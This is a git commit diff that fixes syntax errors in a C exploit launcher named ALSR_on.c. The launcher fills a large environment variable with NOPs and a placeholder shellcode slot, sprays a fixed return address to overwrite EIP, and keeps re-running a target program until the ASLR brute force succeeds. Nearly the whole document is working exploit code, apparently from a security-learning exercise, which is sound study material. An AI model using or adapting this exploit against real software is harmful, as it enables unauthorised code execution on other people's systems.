3ac8385a428bbeba2fae98703066061b9b64610c
Danialkafeel <danialkafeel@gmail.com>
2021-03-28 16:40:52 +0530

    checked

--- ALSR_on/ALSR_on.c
+++ ALSR_on/ALSR_on.c
@@ -3,8 +3,11 @@
 #include<stdlib.h>
 #include<unistd.h>
 
-#define ENV_LEN 12800
-#define RET = 0xbffffffc - ENV_LEN
+// Length of env variable is 128k
+#define ENV_LEN 128000
+
+// Return address we used to overwrite eip
+#define RET 0xbffffffc-ENV_LEN
 
 char shellcode[] = ""; // paste shellcode
 
@@ -13,14 +16,14 @@ int main(int argc, char** argv){
 	char* buff = NULL;
 	char env_var[ENV_LEN];
 	char* env[2] = {env_var, NULL};
-	int *p,i ret, pid, payload_size;
+	int *p,i, ret, pid, payload_size;
 	if(argc<3){
-		printf("Invalid format\n");
+		printf("Invalid format. Type <app_name> <payload_size>\n");
 		exit(1);
 	}
 	//lets get the name of the vulnerable application and the number of bytes needed to overwrite EIP
 	appname = strdup(argv[1]);
-	payload_size = atoi(argv[2])
+	payload_size = atoi(argv[2]);
 	buff = (char *) malloc(payload_size);   
 
 	//Our payload will be first filled with a lot of ox90(NOP)
@@ -31,9 +34,9 @@ int main(int argc, char** argv){
 	//We are going to fill the stack area with our return address. sooner or later, the process execution will be led right there
 	// and EIP will be successfully overwritten
 	p = (int *) buff;
-	for(i=0; i<payload_size; i+= sizeof(int); p++)
+	for(i=0; i<payload_size; i+= sizeof(int), p++)
 	    *p = RET;
-	*p = 0
+	*p = 0;
 
 	// While our process hasnt correctly quit
 	do  {
@@ -49,5 +52,5 @@ int main(int argc, char** argv){
 		    break;
 	    }
 	} while(ret);
-	return 0;
+	return 0;	
 }
